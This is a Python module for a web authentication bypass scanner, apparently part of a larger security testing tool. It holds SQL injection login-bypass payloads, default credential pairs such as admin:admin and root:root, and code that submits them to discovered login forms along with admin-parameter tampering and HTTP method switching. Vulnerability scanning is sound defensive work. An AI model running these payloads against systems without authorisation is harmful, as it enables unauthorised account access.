"""
Authentication Bypass Scanner - Detects authentication bypass vulnerabilities
"""

import re
import logging
import requests
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Any, Optional
from core.config.config_manager import ConfigManager
from core.reporting.report_generator import Finding, Severity
from core.utils.logger import get_security_logger

logger = logging.getLogger(__name__)
security_logger = get_security_logger()

class AuthBypassScanner:
    """Authentication bypass vulnerability scanner."""
    
    def __init__(self, config_manager: ConfigManager):
        """
        Initialize the authentication bypass scanner.
        
        Args:
            config_manager: Configuration manager instance
        """
        self.config = config_manager.get_scanner_config('auth')
        self.general_config = config_manager.get('general')
        
        # Common authentication bypass patterns
        self.bypass_patterns = [
            "admin'--",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "admin' or '1'='1",
            "admin' or '1'='1'--",
            "admin' or '1'='1'#",
            "admin'or 1=1 or ''='",
            "admin' or 1=1",
            "admin' or 1=1--",
            "admin' or 1=1#",
        ]
        
        # Default admin credentials
        self.default_credentials = [
            ("admin", "admin"),
            ("administrator", "administrator"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", ""),
            ("root", "root"),
            ("root", "password"),
            ("test", "test"),
            ("guest", "guest"),
            ("user", "user"),
        ]
        
        # Load payloads
        self.payloads = self._load_payloads()
        
    def scan(self, target_url: str) -> List[Finding]:
        """
        Scan target for authentication bypass vulnerabilities.
        
        Args:
            target_url: Target URL to scan
            
        Returns:
            List of Finding objects
        """
        findings = []
        
        logger.info(f"Starting authentication bypass scan on {target_url}")
        security_logger.log_scan_start("auth_bypass", target_url)
        
        try:
            # Find login forms
            login_forms = self._find_login_forms(target_url)
            
            for form_data in login_forms:
                # Test SQL injection bypass
                findings.extend(self._test_sqli_bypass(form_data))
                
                # Test default credentials
                findings.extend(self._test_default_credentials(form_data))
                
                # Test parameter manipulation
                findings.extend(self._test_parameter_manipulation(form_data))
                
                # Test HTTP method manipulation
                findings.extend(self._test_http_method_bypass(form_data))
                
        except Exception as e:
            logger.error(f"Authentication bypass scan failed: {str(e)}")
            security_logger.log_error("AUTH_SCAN_FAILED", str(e), target_url)
        
        logger.info(f"Authentication bypass scan completed. Found {len(findings)} potential issues.")
        return findings
    
    def _find_login_forms(self, target_url: str) -> List[Dict[str, Any]]:
        """Find login forms on the target."""
        forms = []
        
        try:
            response = requests.get(target_url, timeout=self.general_config.get('timeout', 10))
            
            # Look for login form patterns
            form_patterns = [
                r'<form[^>]*>.*?<input[^>]*name=[\'"]?(?:username|user|login|email)[\'"]?[^>]*>.*?<input[^>]*(?:type=[\'"]?password[\'"]?|name=[\'"]?password[\'"]?)[^>]*>.*?</form>',
                r'<form[^>]*action=[\'"][^\'\"]*login[^\'\"]*[\'"][^>]*>.*?</form>',
                r'<form[^>]*action=[\'"][^\'\"]*auth[^\'\"]*[\'"][^>]*>.*?</form>',
            ]
            
            for pattern in form_patterns:
                matches = re.finditer(pattern, response.text, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    form_html = match.group()
                    form_info = self._parse_form(form_html, target_url)
                    if form_info:
                        forms.append(form_info)
            
        except Exception as e:
            logger.debug(f"Error finding login forms: {str(e)}")
        
        return forms
    
    def _parse_form(self, form_html: str, base_url: str) -> Optional[Dict[str, Any]]:
        """Parse form HTML to extract relevant information."""
        try:
            # Extract action
            action_match = re.search(r'action=[\'"]([^\'\"]*)[\'"]', form_html, re.IGNORECASE)
            action = action_match.group(1) if action_match else ''
            
            if action:
                action_url = urljoin(base_url, action)
            else:
                action_url = base_url
            
            # Extract method
            method_match = re.search(r'method=[\'"]([^\'\"]*)[\'"]', form_html, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else 'POST'
            
            # Extract input fields
            inputs = re.findall(r'<input[^>]*name=[\'"]([^\'\"]*)[\'"][^>]*>', form_html, re.IGNORECASE)
            
            return {
                'url': action_url,
                'method': method,
                'inputs': inputs,
                'form_html': form_html
            }
            
        except Exception as e:
            logger.debug(f"Error parsing form: {str(e)}")
            return None
    
    def _test_sqli_bypass(self, form_data: Dict[str, Any]) -> List[Finding]:
        """Test SQL injection authentication bypass."""
        findings = []
        
        for payload in self.bypass_patterns[:5]:  # Test first 5 patterns
            try:
                data = {}
                
                # Populate form fields with payloads
                for field in form_data['inputs']:
                    if 'password' in field.lower():
                        data[field] = 'test'
                    elif any(x in field.lower() for x in ['user', 'login', 'email']):
                        data[field] = payload
                    else:
                        data[field] = 'test'
                
                response = requests.request(
                    form_data['method'], 
                    form_data['url'], 
                    data=data,
                    timeout=self.general_config.get('timeout', 10),
                    allow_redirects=False
                )
                
                # Check for successful bypass indicators
                if self._is_auth_bypass_successful(response):
                    finding = Finding(
                        title="SQL Injection Authentication Bypass",
                        severity=Severity.HIGH,
                        confidence=0.8,
                        description=f"Authentication bypass using SQL injection payload: {payload}",
                        target=form_data['url'],
                        vulnerability_type="Authentication Bypass",
                        evidence=f"Payload: {payload}, Response status: {response.status_code}",
                        impact="Attacker may gain unauthorized access to the application.",
                        remediation="Implement proper input validation and parameterized queries."
                    )
                    findings.append(finding)
                    break  # Stop after first successful bypass
                    
            except Exception as e:
                logger.debug(f"Error testing SQL injection bypass: {str(e)}")
        
        return findings
    
    def _test_default_credentials(self, form_data: Dict[str, Any]) -> List[Finding]:
        """Test common default credentials."""
        findings = []
        
        for username, password in self.default_credentials[:5]:  # Test first 5 pairs
            try:
                data = {}
                
                # Populate form fields
                for field in form_data['inputs']:
                    if 'password' in field.lower():
                        data[field] = password
                    elif any(x in field.lower() for x in ['user', 'login', 'email']):
                        data[field] = username
                    else:
                        data[field] = 'test'
                
                response = requests.request(
                    form_data['method'], 
                    form_data['url'], 
                    data=data,
                    timeout=self.general_config.get('timeout', 10),
                    allow_redirects=False
                )
                
                if self._is_auth_bypass_successful(response):
                    finding = Finding(
                        title="Default Credentials",
                        severity=Severity.HIGH,
                        confidence=0.9,
                        description=f"Application accepts default credentials: {username}:{password}",
                        target=form_data['url'],
                        vulnerability_type="Authentication Bypass",
                        evidence=f"Credentials: {username}:{password}, Response status: {response.status_code}",
                        impact="Attacker may gain unauthorized access using default credentials.",
                        remediation="Change default credentials and enforce strong password policies."
                    )
                    findings.append(finding)
                    break  # Stop after first successful login
                    
            except Exception as e:
                logger.debug(f"Error testing default credentials: {str(e)}")
        
        return findings
    
    def _test_parameter_manipulation(self, form_data: Dict[str, Any]) -> List[Finding]:
        """Test parameter manipulation bypasses."""
        findings = []
        
        try:
            # Test adding admin parameter
            data = {}
            for field in form_data['inputs']:
                data[field] = 'test'
            
            data['admin'] = '1'
            data['role'] = 'admin'
            data['is_admin'] = 'true'
            
            response = requests.request(
                form_data['method'], 
                form_data['url'], 
                data=data,
                timeout=self.general_config.get('timeout', 10),
                allow_redirects=False
            )
            
            if self._is_auth_bypass_successful(response):
                finding = Finding(
                    title="Parameter Manipulation Authentication Bypass",
                    severity=Severity.MEDIUM,
                    confidence=0.6,
                    description="Authentication bypass via parameter manipulation",
                    target=form_data['url'],
                    vulnerability_type="Authentication Bypass",
                    evidence=f"Added admin parameters, Response status: {response.status_code}",
                    impact="Attacker may bypass authentication by manipulating request parameters.",
                    remediation="Implement proper authorization checks and parameter validation."
                )
                findings.append(finding)
                
        except Exception as e:
            logger.debug(f"Error testing parameter manipulation: {str(e)}")
        
        return findings
    
    def _test_http_method_bypass(self, form_data: Dict[str, Any]) -> List[Finding]:
        """Test HTTP method-based bypass."""
        findings = []
        
        methods = ['GET', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
        
        for method in methods:
            if method == form_data['method']:
                continue
                
            try:
                response = requests.request(
                    method, 
                    form_data['url'],
                    timeout=self.general_config.get('timeout', 10),
                    allow_redirects=False
                )
                
                if self._is_auth_bypass_successful(response):
                    finding = Finding(
                        title="HTTP Method Authentication Bypass",
                        severity=Severity.MEDIUM,
                        confidence=0.5,
                        description=f"Authentication bypass using {method} method",
                        target=form_data['url'],
                        vulnerability_type="Authentication Bypass",
                        evidence=f"Method: {method}, Response status: {response.status_code}",
                        impact="Attacker may bypass authentication using different HTTP methods.",
                        remediation="Implement proper method-based access controls."
                    )
                    findings.append(finding)
                    
            except Exception as e:
                logger.debug(f"Error testing HTTP method bypass: {str(e)}")
        
        return findings
    
    def _is_auth_bypass_successful(self, response: requests.Response) -> bool:
        """Check if authentication bypass was successful."""
        # Check status codes
        if response.status_code in [200, 302, 301]:
            success_indicators = [
                'dashboard', 'welcome', 'admin', 'profile', 'logout',
                'success', 'logged in', 'authenticated'
            ]
            
            response_text = response.text.lower()
            
            # Look for success indicators
            if any(indicator in response_text for indicator in success_indicators):
                return True
                
            # Check for redirect to dashboard/admin area
            location = response.headers.get('location', '').lower()
            if any(indicator in location for indicator in ['dashboard', 'admin', 'home', 'profile']):
                return True
        
        return False
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load authentication bypass payloads."""
        return {
            'sql_injection': self.bypass_patterns,
            'default_creds': [f"{u}:{p}" for u, p in self.default_credentials]
        }